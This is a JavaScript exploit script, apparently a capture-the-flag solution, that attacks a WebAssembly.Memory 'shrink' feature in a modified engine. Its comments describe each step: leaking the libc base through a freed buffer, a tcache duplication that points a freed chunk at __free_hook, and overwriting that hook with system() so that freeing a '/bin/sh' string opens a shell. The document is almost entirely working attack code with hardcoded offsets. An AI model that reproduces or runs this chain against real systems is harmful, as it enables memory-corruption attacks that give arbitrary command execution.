const RELEASE = true;

// convert integer to hex string
const hex = (i) => { return `0x${i.toString(16)}`; }


// get libc base

let mem = new WebAssembly.Memory({ initial: 1 });
mem.shrink(1);
let buf = mem.buffer;
mem.shrink(1);
let view = new DataView(buf);
let libc = view.getBigUint64(0, true) - (RELEASE ? 0x1ed360n : 0x1ecbe0n);
console.log(`[+] libc == ${hex(libc)}`);

let system = libc + 0x52290n; // __libc_system()
let free_hook = libc + 0x1eee48n; // __free_hook


// tcache dup

let mem1 = new WebAssembly.Memory({ initial: 1 });
mem1.shrink(0xfc08); // chunk size is 0x400

let mem2 = new WebAssembly.Memory({ initial: 1 });
mem2.shrink(0xfc08); // chunk size is 0x400
buf = mem2.buffer;

mem1.shrink(0x398); // free backing store of mem1 => tcache
mem2.shrink(0x398); // free backing store of mem2 => tcache

view = new DataView(buf);
view.setBigUint64(0, free_hook, true); // overwrite forward pointer of freed chunk in tcache


// get shell

mem2 = new WebAssembly.Memory({ initial: 1 });
mem2.shrink(0xfc08); // chunk size is 0x400
mem1 = new WebAssembly.Memory({ initial: 1 });
mem1.shrink(0xfc08); // backing store of mem1 is fake chunk at __free_hook

let cmd = "/bin/sh\x00"; // command to execute
view = new DataView(mem2.buffer);
for (let i = 0; i < cmd.length; i++) { view.setUint8(i, cmd.charCodeAt(i)); } // write cmd to backing store of mem2

view = new DataView(mem1.buffer);
view.setBigUint64(0, system, true); // overwrite __free_hook with address of system() => call system() instead of free()
mem2.shrink(0x398); // call free(cmd) => system(cmd)
